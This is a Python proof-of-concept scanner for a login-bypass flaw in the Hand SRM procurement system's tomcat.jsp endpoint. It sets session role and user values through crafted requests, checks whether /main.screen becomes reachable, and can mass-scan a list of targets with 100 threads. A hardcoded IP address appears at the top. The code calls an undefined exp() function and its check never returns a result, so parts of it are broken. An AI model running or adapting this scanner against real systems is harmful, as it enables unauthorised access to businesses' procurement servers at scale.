#https://39.106.224.203/
import argparse
import re
import requests
import sys
import os
import time

from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(targer):
    url = targer
    paload1 = "/tomcat.jsp?dataName=role_id&dataValue=1"
    paload2 = "/tomcat.jsp?dataName=user_id&dataValue=1"
    paload3 = "/main.screen"
    headers = {
        "Cookie": "JSESSIONID=4C2DB933694BFE82A90E9642C2ED33EC.jvm1; route=e5f841423e85173e5c9d73df8bb9c9d0; ISTIMEOUT=false; vh=499; vw=1280",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    }
    res1 = requests.get(url = url+paload1,headers = headers,verify = False,timeout=5).text
    res2 = requests.get(url=url + paload2, headers=headers, verify=False, timeout=5).text
    res3 = requests.get(url=url + paload3, headers=headers, verify=False, timeout=5).text
    if "SRM SERVER Info." in res1:
        if "SRM SERVER Info." in res2:
            if "function" in res3:
                print("存在漏洞！！！！！"+targer)
            else:
                print("不存在漏洞")
        else:
            print("不存在漏洞")
    else:
        print("不存在漏洞")





def banna():
    banna = """
             ▄▄▄▄    ▄▄▄       ███▄    █  ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
    ▓█████▄ ▒████▄     ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
    ▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
    ▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
    ░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
    ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
    ▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
     ░    ░   ░   ▒      ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
     ░            ░  ░         ░       ░  ░         ░       ░  ░            ░ ░      ░ ░      ░  ░
          ░                                                                                       

    """
    print(banna)


def main():
    banna()

    parser = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登陆绕过漏洞")
    parser.add_argument("-u","--url",help="YOUR URL")
    parser.add_argument("-f","--file",help="YOUR FILE")

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)

    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as  fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()